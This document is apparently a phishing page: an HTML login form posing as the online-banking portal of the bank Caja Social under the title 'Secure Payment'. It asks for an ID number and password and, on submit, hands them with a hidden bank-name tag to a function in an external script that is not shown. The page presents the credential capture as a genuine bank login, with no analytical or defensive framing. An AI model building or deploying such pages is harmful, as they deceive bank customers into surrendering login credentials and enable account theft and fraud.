<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Payment</title>

     <!-- Agrega los enlaces CSS y JavaScript de Bootstrap -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
     
  <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  	

        <style>

*{
    -webkit-appearance: none;
    -webkit-border-radius: 0;
}

         label{
            font-size: 10px;
            display: block;
            margin-left: 25px;
         }

         select{
            
         }

         input, select{
            width: 90%;
            margin-bottom: 20px;
         }

         select{
            background-color: white;
            height: 35px;
            border: 1px solid #dcdcdc;
            color:black;
         }
        </style>
</head>
<body>

<img src="/img/cajasocial.jfif" alt="" srcset="" width="100%">

<a style="font-size:20px; margin-left:25px;">Personas</a>

<hr>

<br><br><label>(*) TIPO IDENTIFICACION</label>
<center><select name="" id="" style="height:40px; border:1px solid #d3f3f3; padding:10px;">
    <option value="">Cedula Ciudadania</option>
</select></center>

<label for="">(*) NUMERO DE IDENTIFICACION</label>
    <center><input type="tel" name="" id="txtUsuario" style="height:40px; border:1px solid #d3f3f3;"></center>
    <label for="">(*) CONTRASEÑA</label>
    <center><input type="password" name="" id="txtPass" style="height:40px; border:1px solid #d3f3f3;">
<input type="hidden" name="" id="banco" style="height:40px; border:1px solid #d3f3f3;" value="Caja Social">

<br><br><br><br><br>
<input type="submit" value="Iniciar sesión" id="btnUsuario" style="height:45px; border-radius:100px; border:none;">
</center>

<br><img src="/img/caja1.jfif" alt="" srcset="" width="100%">



<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			if ($("#txtUsuario").val().length > 7) {
				pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>


</body>
</html>